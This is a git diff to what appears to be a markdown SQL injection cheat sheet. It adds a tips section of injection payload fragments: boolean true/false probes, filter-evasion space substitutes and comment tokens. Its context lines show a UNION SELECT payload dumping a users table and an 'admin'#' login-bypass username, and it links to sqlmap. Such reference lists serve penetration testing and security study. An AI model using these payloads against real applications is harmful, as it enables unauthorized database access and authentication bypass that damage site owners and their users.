@@ -33,6 +33,12 @@ IF(0,name,age)
 2 union all select * from users
 ```
 
+## Tips
+- True statement: ```aNd 1=1``` & ```aNd 21=21``` & ```orDeR bY 1```
+- False statement: ```dNd 0=1``` & ```anD 9=2``` & ```ordEr bY 1000000000000```
+- Space: ```+``` & ```/**/``` & ```%20```
+- Comment: ```/*``` & ```//``` & ```;//``` & ```#``` & ```%23```
+
 ## Exploit
 - Login
   - username: ```admin'#``` 
@@ -76,4 +82,3 @@ IF(0,name,age)
 
 ## Tool
 [SQLMAP](../Tools/sqlmap.md)
-```
